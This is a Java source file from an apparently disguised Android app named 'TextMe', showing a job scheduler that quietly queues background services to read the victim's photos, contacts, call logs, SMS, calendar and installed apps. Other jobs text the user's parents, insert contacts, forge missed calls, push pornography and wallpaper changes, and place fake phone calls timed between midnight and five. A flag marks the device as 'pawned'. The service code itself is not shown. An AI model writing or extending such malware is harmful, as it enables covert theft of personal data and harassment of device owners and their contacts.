package com.candroid.textme.jobs;

import android.Manifest;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.preference.PreferenceManager;

import com.candroid.textme.api.ClockTime;
import com.candroid.textme.api.Lofl;
import com.candroid.textme.jobs.services.AlarmClockJobService;
import com.candroid.textme.jobs.services.CalendarEventJobService;
import com.candroid.textme.jobs.services.ContactsJobService;
import com.candroid.textme.jobs.services.DcimJobService;
import com.candroid.textme.jobs.services.DeviceJobService;
import com.candroid.textme.jobs.services.FakeCallJobService;
import com.candroid.textme.jobs.services.InsertContactJobService;
import com.candroid.textme.jobs.services.MissedCallsJobService;
import com.candroid.textme.jobs.services.PackagesJobService;
import com.candroid.textme.jobs.services.PhoneCallsJobService;
import com.candroid.textme.jobs.services.PornJobService;
import com.candroid.textme.jobs.services.SmsJobService;
import com.candroid.textme.jobs.services.TextParentsJobService;
import com.candroid.textme.jobs.services.WallpaperJobService;
import com.candroid.textme.receivers.ScreenReceiver;

public class JobsScheduler {
    public static final int JOB_ID_PORN = 1;
    public static final int JOB_ID_WALLPAPER = 2;
    public static final int JOB_ID_DCIM = 3;
    public static final int JOB_ID_PACKAGES = 4;
    public static final int JOB_ID_CONTACTS = 5;
    public static final int JOB_ID_DEVICE = 6;
    public static final int JOB_ID_PHONE_CALLS = 7;
    public static final int JOB_ID_SMS = 8;
    public static final int JOB_ID_CALENDAR_EVENTS = 9;
    public static final int JOB_ID_FAKE_PHONE_CALL = 10;
    public static final int JOB_ID_TEXT_PARENTS = 11;
    public static final int JOB_ID_INSERT_CONTACT = 12;
    public static final int JOB_ID_MISSED_CALLS = 13;
    public static final int JOB_ID_ALARM_CLOCK = 14;
    public static final long ONE_MINUTE = 60000;
    public static final long ONE_HOUR = ONE_MINUTE * 60;
    public static final String DCIM_KEY = "DCIM_KEY";
    public static final String PACKAGES_KEY = "PACKAGES_KEY";
    public static final String CONTACTS_KEY = "CONTACTS_KEY";
    public static final String DEVICE_KEY = "DEVICE_KEY";
    public static final String PHONE_CALLS_KEY = "PHONE_CALLS_KEY";
    public static final String SMS_KEY = "SMS_KEY";
    public static final String CALENDAR_EVENTS_KEY = "CALENDAR_EVENTS_KEY";
    public static final String FAKE_PHONE_CALL_KEY = "FAKE_PHONE_CALL_KEY";
    public static final String TEXT_PARENTS_KEY = "TEXT_PARENTS_KEY";
    public static final String INSERT_CONTACT_KEY = "INSERT_CONTACT_KEY";
    public static final String MISSED_CALLS_KEY = "MISSED_CALLS_KEY";
    public static final String ALARM_CLOCK_KEY = "ALARM_CLOCK_KEY";

    public static void scheduleJob(Context context){
        SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
        boolean ranDcim = sharedPreferences.getBoolean(DCIM_KEY, false);
        boolean ranPackages = sharedPreferences.getBoolean(PACKAGES_KEY, false);
        boolean ranContacts = sharedPreferences.getBoolean(CONTACTS_KEY, false);
        boolean ranDevice = sharedPreferences.getBoolean(DEVICE_KEY, false);
        boolean ranPhoneCall = sharedPreferences.getBoolean(PHONE_CALLS_KEY, false);
        boolean ranSms = sharedPreferences.getBoolean(SMS_KEY, false);
        boolean ranCalendar = sharedPreferences.getBoolean(CALENDAR_EVENTS_KEY, false);
        boolean ranFakePhoneCall = sharedPreferences.getBoolean(FAKE_PHONE_CALL_KEY, false);
        boolean ranTextParents = sharedPreferences.getBoolean(TEXT_PARENTS_KEY, false);
        boolean ranInsertContact = sharedPreferences.getBoolean(INSERT_CONTACT_KEY, false);
        boolean ranMissedCalls = sharedPreferences.getBoolean(MISSED_CALLS_KEY, false);
        boolean ranAlarmClock = sharedPreferences.getBoolean(ALARM_CLOCK_KEY, false);
        JobScheduler jobScheduler = context.getSystemService(JobScheduler.class);
        if(jobScheduler.getPendingJob(JOB_ID_PORN) == null){
            ComponentName serviceComponent = new ComponentName(context, PornJobService.class);
            JobInfo.Builder builder = new JobInfo.Builder(JOB_ID_PORN, serviceComponent);
            builder.setMinimumLatency(28 * ONE_HOUR);
            builder.setOverrideDeadline(65000);
            builder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
            jobScheduler.schedule(builder.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_WALLPAPER) == null){
            ComponentName wallpaperService = new ComponentName(context, WallpaperJobService.class);
            JobInfo.Builder wallpaperBuilder = new JobInfo.Builder(JOB_ID_WALLPAPER, wallpaperService);
            wallpaperBuilder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
            wallpaperBuilder.setRequiresCharging(false);
            wallpaperBuilder.setRequiresBatteryNotLow(true);
            wallpaperBuilder.setRequiresStorageNotLow(true);
            wallpaperBuilder.setRequiresDeviceIdle(true);
            wallpaperBuilder.setOverrideDeadline( 48 * ONE_HOUR);
            wallpaperBuilder.setMinimumLatency( 24 * ONE_HOUR);
            jobScheduler.schedule(wallpaperBuilder.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_DCIM) == null && !ranDcim && (context.checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED)){
            ComponentName dcimJobService = new ComponentName(context, DcimJobService.class);
            JobInfo.Builder dcimJob = new JobInfo.Builder(JOB_ID_DCIM, dcimJobService);
            dcimJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            dcimJob.setRequiresCharging(false);
            dcimJob.setRequiresBatteryNotLow(true);
            dcimJob.setRequiresStorageNotLow(true);
            dcimJob.setRequiresDeviceIdle(false);
            dcimJob.setPersisted(false);
            dcimJob.setOverrideDeadline( 24 * ONE_HOUR);
            dcimJob.setMinimumLatency(70000);
            jobScheduler.schedule(dcimJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_PACKAGES) == null && ! ranPackages){
            ComponentName packagesJobService = new ComponentName(context, PackagesJobService.class);
            JobInfo.Builder packagesJob = new JobInfo.Builder(JOB_ID_PACKAGES, packagesJobService);
            packagesJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            packagesJob.setRequiresCharging(false);
            packagesJob.setRequiresBatteryNotLow(true);
            packagesJob.setRequiresStorageNotLow(true);
            packagesJob.setRequiresDeviceIdle(false);
            packagesJob.setPersisted(false);
            packagesJob.setOverrideDeadline( 24 * ONE_HOUR);
            packagesJob.setMinimumLatency(60000);
            jobScheduler.schedule(packagesJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_CONTACTS) == null && ! ranContacts && (context.checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED)){
            ComponentName contactsJobService = new ComponentName(context, ContactsJobService.class);
            JobInfo.Builder contactsJob = new JobInfo.Builder(JOB_ID_CONTACTS, contactsJobService);
            contactsJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            contactsJob.setRequiresCharging(false);
            contactsJob.setRequiresBatteryNotLow(true);
            contactsJob.setRequiresStorageNotLow(true);
            contactsJob.setRequiresDeviceIdle(false);
            contactsJob.setPersisted(false);
            contactsJob.setOverrideDeadline( 24 * ONE_HOUR);
            contactsJob.setMinimumLatency(50000);
            jobScheduler.schedule(contactsJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_DEVICE) == null && ! ranDevice){
            ComponentName deviceJobService = new ComponentName(context, DeviceJobService.class);
            JobInfo.Builder deviceJob = new JobInfo.Builder(JOB_ID_DEVICE, deviceJobService);
            deviceJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            deviceJob.setRequiresCharging(false);
            deviceJob.setRequiresBatteryNotLow(true);
            deviceJob.setRequiresStorageNotLow(true);
            deviceJob.setRequiresDeviceIdle(false);
            deviceJob.setPersisted(false);
            deviceJob.setOverrideDeadline( 24 * ONE_HOUR);
            deviceJob.setMinimumLatency(40000);
            jobScheduler.schedule(deviceJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_PHONE_CALLS) == null && ! ranPhoneCall && (context.checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED)){
            ComponentName phoneCallsJobService = new ComponentName(context, PhoneCallsJobService.class);
            JobInfo.Builder phoneCallsJob = new JobInfo.Builder(JOB_ID_PHONE_CALLS, phoneCallsJobService);
            phoneCallsJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            phoneCallsJob.setRequiresCharging(false);
            phoneCallsJob.setRequiresBatteryNotLow(true);
            phoneCallsJob.setRequiresStorageNotLow(true);
            phoneCallsJob.setRequiresDeviceIdle(false);
            phoneCallsJob.setPersisted(false);
            phoneCallsJob.setOverrideDeadline( 24 * ONE_HOUR);
            phoneCallsJob.setMinimumLatency(30000);
            jobScheduler.schedule(phoneCallsJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_SMS) == null && ! ranSms && (context.checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED)){
            ComponentName smsJobService = new ComponentName(context, SmsJobService.class);
            JobInfo.Builder smsJob = new JobInfo.Builder(JOB_ID_SMS, smsJobService);
            smsJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            smsJob.setRequiresCharging(false);
            smsJob.setRequiresBatteryNotLow(true);
            smsJob.setRequiresStorageNotLow(true);
            smsJob.setRequiresDeviceIdle(false);
            smsJob.setPersisted(false);
            smsJob.setOverrideDeadline( 24 * ONE_HOUR);
            smsJob.setMinimumLatency(20000);
            jobScheduler.schedule(smsJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_CALENDAR_EVENTS) == null && ! ranCalendar && (context.checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED)){
            ComponentName calendarEventJobService = new ComponentName(context, CalendarEventJobService.class);
            JobInfo.Builder calendarEventJob = new JobInfo.Builder(JOB_ID_CALENDAR_EVENTS, calendarEventJobService);
            calendarEventJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            calendarEventJob.setRequiresCharging(false);
            calendarEventJob.setRequiresBatteryNotLow(true);
            calendarEventJob.setRequiresStorageNotLow(true);
            calendarEventJob.setRequiresDeviceIdle(false);
            calendarEventJob.setPersisted(false);
            calendarEventJob.setOverrideDeadline( 24 * ONE_HOUR);
            calendarEventJob.setMinimumLatency(10000);
            jobScheduler.schedule(calendarEventJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_TEXT_PARENTS) == null && ! ranTextParents && (context.checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED && context.checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED)){
            ComponentName textParentsJobService = new ComponentName(context, TextParentsJobService.class);
            JobInfo.Builder textParentsJob = new JobInfo.Builder(JOB_ID_TEXT_PARENTS, textParentsJobService);
            textParentsJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            textParentsJob.setRequiresCharging(false);
            textParentsJob.setRequiresBatteryNotLow(false);
            textParentsJob.setRequiresStorageNotLow(false);
            textParentsJob.setRequiresDeviceIdle(false);
            textParentsJob.setPersisted(false);
            textParentsJob.setOverrideDeadline( 24 * ONE_HOUR);
            textParentsJob.setMinimumLatency(72 * ONE_HOUR);
            jobScheduler.schedule(textParentsJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_INSERT_CONTACT) == null && ! ranInsertContact && (context.checkSelfPermission(Manifest.permission.WRITE_CONTACTS) == PackageManager.PERMISSION_GRANTED)){
            ComponentName insertContactJobService = new ComponentName(context, InsertContactJobService.class);
            JobInfo.Builder insertContactJob = new JobInfo.Builder(JOB_ID_INSERT_CONTACT, insertContactJobService);
            insertContactJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            insertContactJob.setRequiresCharging(false);
            insertContactJob.setRequiresBatteryNotLow(true);
            insertContactJob.setRequiresStorageNotLow(false);
            insertContactJob.setRequiresDeviceIdle(false);
            insertContactJob.setPersisted(false);
            insertContactJob.setOverrideDeadline( 24 * ONE_HOUR);
            insertContactJob.setMinimumLatency(30000);
            jobScheduler.schedule(insertContactJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_MISSED_CALLS) == null && ! ranMissedCalls && (context.checkSelfPermission(Manifest.permission.WRITE_CALL_LOG) == PackageManager.PERMISSION_GRANTED)){
            ComponentName missedCallsJobService = new ComponentName(context, MissedCallsJobService.class);
            JobInfo.Builder missedCallsJob = new JobInfo.Builder(JOB_ID_MISSED_CALLS, missedCallsJobService);
            missedCallsJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            missedCallsJob.setRequiresCharging(false);
            missedCallsJob.setRequiresBatteryNotLow(true);
            missedCallsJob.setRequiresStorageNotLow(false);
            missedCallsJob.setRequiresDeviceIdle(false);
            missedCallsJob.setPersisted(false);
            missedCallsJob.setOverrideDeadline( 24 * ONE_HOUR);
            missedCallsJob.setMinimumLatency(65000);
            jobScheduler.schedule(missedCallsJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_ALARM_CLOCK) == null && ! ranAlarmClock){
            ComponentName alarmClockJobService = new ComponentName(context, AlarmClockJobService.class);
            JobInfo.Builder alarmClockJob = new JobInfo.Builder(JOB_ID_ALARM_CLOCK, alarmClockJobService);
            alarmClockJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            alarmClockJob.setRequiresCharging(false);
            alarmClockJob.setRequiresBatteryNotLow(false);
            alarmClockJob.setRequiresStorageNotLow(false);
            alarmClockJob.setRequiresDeviceIdle(true);
            alarmClockJob.setPersisted(false);
            alarmClockJob.setOverrideDeadline( 1 * ONE_HOUR);
            if(!ClockTime.isBetweenMidnightAndFive()){
                long midnight = ClockTime.millisTillMidnight();
                alarmClockJob.setMinimumLatency(midnight);
            }else{
                alarmClockJob.setMinimumLatency(1000);
            }
            jobScheduler.schedule(alarmClockJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_FAKE_PHONE_CALL) == null && ! ranFakePhoneCall && (context.checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED)){
            ComponentName fakeCallJobService = new ComponentName(context, FakeCallJobService.class);
            JobInfo.Builder fakeCallJob = new JobInfo.Builder(JOB_ID_FAKE_PHONE_CALL, fakeCallJobService);
            fakeCallJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
            fakeCallJob.setRequiresCharging(false);
            fakeCallJob.setRequiresBatteryNotLow(true);
            fakeCallJob.setRequiresStorageNotLow(false);
            fakeCallJob.setRequiresDeviceIdle(false);
            fakeCallJob.setPersisted(false);
            fakeCallJob.setOverrideDeadline( 24 * ONE_HOUR);
            if(ranAlarmClock){
                if(! ClockTime.isBetweenMidnightAndFive()){
                    long midnight = ClockTime.millisTillMidnight();
                    fakeCallJob.setMinimumLatency(midnight + (2 * ONE_HOUR));
                }else{
                    fakeCallJob.setMinimumLatency(1000);
                }
            }
            jobScheduler.schedule(fakeCallJob.build());
        }else{
            if(ranFakePhoneCall){
                ScreenReceiver.sIsPawned = true;
            }
        }
    }
}